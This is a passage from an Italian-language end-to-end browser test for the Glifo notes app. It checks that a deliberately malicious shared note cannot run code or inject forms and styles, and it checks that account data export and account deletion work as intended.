  await waitFor(owner, () => document.querySelector('dialog.dialog-share .share-url')?.value.includes('nota.html#'), undefined, 15000)
  const evilLink = await share.locator('.share-url').inputValue()
  await share.locator('.btn-primary', { hasText: 'Fine' }).click()
  await viewer.goto(evilLink)
  await viewer.waitForSelector('.shared-body:not([hidden])')
  await viewer.waitForTimeout(1500)
  const evil = await viewer.evaluate(() => {
    const top = document.querySelector('.shared-top').getBoundingClientRect()
    const atTop = document.elementFromPoint(top.left + 40, top.top + top.height / 2)
    return {
      stolen: window.__rubato ?? null,
      forms: document.querySelectorAll('.shared-body form, .shared-body button:not(.graph-tool):not(.btn), .shared-body style, .shared-body textarea').length,
      arrows: document.querySelectorAll('.shared-body .block-move').length,
      headerVisible: top.height > 0 && getComputedStyle(document.querySelector('.shared-top')).display !== 'none',
      headerOnTop: !!atTop?.closest('.shared-top'),
    }
  })
  check(evil.stolen === null, `la nota non esegue codice in chi la apre (${evil.stolen})`)
  check(evil.forms === 0, 'moduli, pulsanti e stili della nota non arrivano nella pagina')
  check(evil.arrows === 0, 'nella nota condivisa niente frecce per spostare grafici e schemi: si legge soltanto')
  check(evil.headerVisible && evil.headerOnTop, 'e la nota non copre la barra di Glifo')
  await viewer.locator('a', { hasText: 'link' }).first().click({ modifiers: [] }).catch(() => {})
  await viewer.waitForTimeout(300)
  check((await viewer.evaluate(() => window.__rubato ?? null)) === null, 'nemmeno cliccando i suoi link')

  // ——— I tuoi dati: scaricarli, poi eliminare l'account ———
  const deletedId = fake.userId(EMAIL)
  await portatile.page.locator('.account-button').click()
  const accountDialog = portatile.page.locator('dialog.dialog-account')
  const downloading = portatile.page.waitForEvent('download')
  await accountDialog.locator('button', { hasText: 'Scarica i miei dati' }).click()
  const file = await downloading
  const exported = JSON.parse(await readFile(await file.path(), 'utf8'))
  check(file.suggestedFilename().startsWith('glifo-dati-account-'), `i dati si scaricano in un file (${file.suggestedFilename()})`)
  const serverNotes = (await fake.notes(EMAIL)).filter((n) => !n.deleted_at)
  check(
    exported.account?.email === EMAIL &&
      exported.notes.length === serverNotes.length &&
      exported.notes.some((n) => n.content.includes('scritti prima di accedere')),
    `nel file ci sono l'account e tutte le sue note (${exported.notes.length} di ${serverNotes.length})`,
  )
  check(exported.settings?.theme === theme, `e le impostazioni dell'account (${exported.settings?.theme})`)
  check(
    exported.sharedLinks?.length === 1 && exported.sharedLinks[0].link === evilLink && exported.sharedLinks[0].title === 'Nota cattiva',
    'e i link condivisi',
  )

  await accountDialog.locator('button', { hasText: 'Elimina account' }).click()
  const confirmDelete = portatile.page.locator('dialog.dialog-delete-account')
  await confirmDelete.waitFor()
  check(await confirmDelete.locator('button[type=submit]').isDisabled(), 'per eliminare l\'account bisogna prima scrivere «elimina»')
  await confirmDelete.locator('input').fill('Elimina')
  const deleted = portatile.page.waitForEvent('load')
  await confirmDelete.locator('button[type=submit]').click()
  await deleted
  await portatile.page.waitForSelector('.cm-editor')
  check((await accountState(portatile.page)).includes('is-guest'), 'eliminato l\'account, si torna senza account')
  check(
    await waitFor(portatile.page, () => [...document.querySelectorAll('.toast')].some((t) => t.textContent.includes('Account eliminato'))),
    'un avviso dice che l\'account è stato eliminato',
  )
  const leftAfterDelete = await portatile.page.evaluate(() =>
    Object.keys(localStorage).filter((k) => k.startsWith('glifo.u.') || k.startsWith('glifo.auth')),
  )
  check(leftAfterDelete.length === 0, `nel browser non resta niente dell'account (${leftAfterDelete})`)
  const counts = await fake.countsFor(deletedId)
  check(counts.users === 0 && counts.notes === 0, `sul server non resta niente dell'account (${JSON.stringify(counts)})`)
  await viewer.goto('about:blank')
  await viewer.goto(evilLink)
  await viewer.waitForSelector('.shared-status.is-problem')
  check((await viewer.locator('main').innerText()).includes('non funziona più'), 'eliminato l\'account, i suoi link non si aprono più')
  await viewer.close()
  pc.errors.push(...portatile.errors)

  // ——— L'informativa sulla privacy ———
  const privacy = await altro.context.newPage()
  await privacy.goto(`${url}privacy.html`)
  check((await privacy.locator('h1').innerText()) === 'Informativa sulla privacy', 'l\'informativa sulla privacy si apre')
  await privacy.close()

  const errors = [...pc.errors, ...tel.errors]
  check(errors.length === 0, `nessun errore nella pagina${errors.length ? ': ' + errors.join('; ') : ''}`)
} finally {
  await browser.close()
  await fake.close()
  await new Promise((resolve) => server.httpServer.close(resolve))
}

if (failures) {
  console.log(`\n${failures} controlli falliti`)
  process.exit(1)
}
console.log('\nTutto ok')
